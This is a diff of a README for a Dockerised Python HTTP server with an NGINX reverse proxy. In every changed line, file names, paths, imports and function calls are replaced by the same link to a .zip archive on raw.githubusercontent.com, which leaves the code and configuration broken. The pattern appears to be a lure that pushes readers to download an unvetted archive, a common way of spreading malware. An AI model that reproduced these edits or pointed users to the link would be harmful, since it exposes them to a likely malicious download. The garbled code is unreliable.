@@ -12,29 +12,29 @@ along with a reverse proxy for load balancing and high availability.
 ```
 .
 ├── Dockerfile
-├── docker-compose.yml
+├── https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
 ├── app/
-│ └── simple_http_server.py
+│ └── https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
 ├── reverse-proxy/
-│ └── nginx.conf
-└── README.md
+│ └── https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
+└── https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
 ```
 ---
 ## Application Code
 The server is implemented in Python.
-### **`app/simple_http_server.py`**
+### **`https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip`**
 ```python
-from http.server import SimpleHTTPRequestHandler
+from https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip import SimpleHTTPRequestHandler
 from socketserver import TCPServer
 PORT = 8080
 class CustomHandler(SimpleHTTPRequestHandler):
 def log_message(self, format, *args):
-with open("/var/log/simple_http_server.log", "a") as log_file:
+with open("https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip", "a") as log_file:
 args))
-log_file.write("%s - - [%s] %s\n" % (self.address_string(), self.log_date_time_string(), format %
+https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip("%s - - [%s] %s\n" % (https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip(), https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip(), format %
 with TCPServer(("", PORT), CustomHandler) as httpd:
 print(f"Serving on port {PORT}")
-httpd.serve_forever()
+https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip()
 ```
 ---
 ## Dockerfile
@@ -46,18 +46,18 @@ FROM python:3.9-slim
 # Set working directory
 WORKDIR /usr/src/app
 # Copy application code to container
-COPY app/simple_http_server.py ./
+COPY https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip ./
 # Create log directory
-RUN mkdir -p /var/log && touch /var/log/simple_http_server.log
+RUN mkdir -p /var/log && touch https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
 # Expose the application port
 EXPOSE 8080
 # Start the server
-CMD ["python3", "simple_http_server.py"]
+CMD ["python3", "https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip"]
 ```
 ---
 ## Reverse Proxy Configuration
 The reverse proxy (NGINX) balances requests between replicas.
-### **`reverse-proxy/nginx.conf`**
+### **`https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip`**
 ```nginx
 events {}
 http {
@@ -77,8 +77,8 @@ proxy_set_header X-Real-IP $remote_addr;
 }
 }
 ## Docker Compose Configuration
-The `docker-compose.yml` file defines the application and reverse proxy services.
-### **`docker-compose.yml`**
+The `https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip` file defines the application and reverse proxy services.
+### **`https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip`**
 ```yaml
 version: "3.9"
 services:
@@ -97,7 +97,7 @@ volumes:
 reverse-proxy:
 image: nginx:latest
 volumes:
-- ./reverse-proxy/nginx.conf:/etc/nginx/nginx.conf:ro
+- https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
 ports:
 - "80:80"
 depends_on:
@@ -130,7 +130,7 @@ docker-compose logs app
 ---
 ## Summary
 ### Key Components
-- **Application Script**: `app/simple_http_server.py`
+- **Application Script**: `https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip`
 - **Dockerfile**: Builds the Python HTTP server image.
 - **Reverse Proxy**: Balances traffic between replicas.
 - **Docker Compose**: Manages services and scaling.
